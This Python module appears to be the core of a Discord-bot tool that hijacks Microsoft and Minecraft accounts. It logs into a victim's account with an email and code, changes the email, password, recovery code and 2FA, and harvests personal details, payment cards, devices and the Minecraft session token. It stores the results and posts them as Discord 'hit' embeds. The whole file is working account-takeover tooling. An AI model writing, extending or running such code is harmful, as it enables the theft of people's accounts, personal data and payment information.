from securing.utils.cookies.get_livedata import livedata
from securing.build_embeds import build_account_embeds
from securing.auth.polish_host import polish_host
from securing.auth.get_msaauth import get_msaauth
from securing.utils.secure import secure

from database.database import DBConnection
from discord import Embed
import httpx
import uuid
import time
import logging

async def startSecuringAccount(session: httpx.AsyncClient, email, device = None, code = None, recovery = True, ppft = None, rextra= None, command = False):
    # Handles the data to be displayed in embeds to discord
    
    print(f"Got 1")
    data = await livedata(session)
    msaauth = await get_msaauth(session, email, device, data, code, ppft)
    
    account = {
        "microsoft": {
            "email": "Couldn't Change!",
            "security_email": "Couldn't Change!",
            "password": "Couldn't Change!",
            "recovery_code": "Couldn't Change!",
            "auth_secret": "Disabled",
            "firstName": "Failed to Get",
            "lastName": "Failed to Get",
            "fullName": "Failed to Get",
            "region": "Failed to Get",
            "birthday": "Failed to Get",
            "language": "Failed to Get",
            "family": [],
            "devices": [],
            "cards": [],
            "subscriptions": {
                "active": [], 
                "canceled": [], 
                "commercial": []
            },
            "phones": [],
        },
        "minecraft": {
            "name": "No Minecraft",
            "method": "Not purchased",
            "gamertag": "Not Found",
            "uchange": "0 Days",
            "capes": "No capes",
            "SSID": False
        }
    }

    initialTime = time.time()

    if isinstance(msaauth, dict) and msaauth.get("_error"):
        return {"failed": True, "reason": msaauth["_error"]}

    if not msaauth:
        return {"failed": True, "reason": "Login failed — no MSAAUTH session."}
    
    if rextra:
        account["microsoft"]["password"] = rextra["password"]
        account["microsoft"]["security_email"] = rextra["security_email"]
        account["microsoft"]["recovery_code"] = rextra["recovery_code"]
    
    match msaauth:
        case "Recovery":
            print(f"[X] - Account requires account recovery")
            return {"failed": True, "reason": "Account requires Microsoft account recovery."}
        
        case "Family":
            print(f"[X] - Account is Family Locked")
            account["minecraft"]["name"] = "Child Locked"
            account["microsoft"]["email"] = "Child Locked"
            account["microsoft"]["security_email"] = "Child Locked"
            
        case _:
            print(f"[+] - Got MSAAUTH")
            await polish_host(session, msaauth)
            print(f"[~] - Polished MSAAUTH")
            account = await secure(
                session = session, 
                recovery = recovery,
                account_info = account,
                command = command
            )

    finalTime = (time.time() - initialTime)

    account_id = uuid.uuid4().hex
    with DBConnection() as db:
        db.add_secured_account(account_id, account)

    try:
        return await build_account_embeds(account, finalTime, account_id)
    except Exception as exc:
        logging.exception("build_account_embeds failed after securing")
        ms = account["microsoft"]
        hit_embed = Embed(
            title=f"Secured in {round(finalTime, 2)}s (embed partial)",
            description=f"Account secured but detail embed failed: `{exc.__class__.__name__}: {exc}`",
            color=0x279CF5,
        )
        hit_embed.add_field(name="Primary Email", value=f"```{ms.get('email', 'Unknown')}```", inline=False)
        hit_embed.add_field(name="Security Email", value=f"```{ms.get('security_email', 'Unknown')}```", inline=True)
        hit_embed.add_field(name="Password", value=f"```{ms.get('password', 'Unknown')}```", inline=True)
        hit_embed.add_field(name="Recovery Code", value=f"```{ms.get('recovery_code', 'Unknown')}```", inline=False)
        hit_embed.add_field(name="MC Username", value=f"```{account['minecraft'].get('name', 'Unknown')}```", inline=False)
        return {
            "hit_embed": hit_embed,
            "account_id": account_id,
            "minecraft": account["minecraft"],
            "details": {
                "stats_embed": hit_embed,
                "ssid_embed": hit_embed,
                "info_embed": hit_embed,
                "xbox_embed": hit_embed,
                "family_embed": hit_embed,
                "devices_embed": hit_embed,
                "cards_embed": hit_embed,
                "subs_embed": hit_embed,
                "phones_embed": hit_embed,
                "account_details": (
                    f"**Username:** {account['minecraft'].get('name', 'Unknown')}\n"
                    f"**Email:** {ms.get('email', 'Unknown')}\n"
                    f"**Security Email:** {ms.get('security_email', 'Unknown')}\n"
                    f"**Password:** {ms.get('password', 'Unknown')}\n"
                    f"**Recovery Code:** {ms.get('recovery_code', 'Unknown')}"
                ),
            },
        }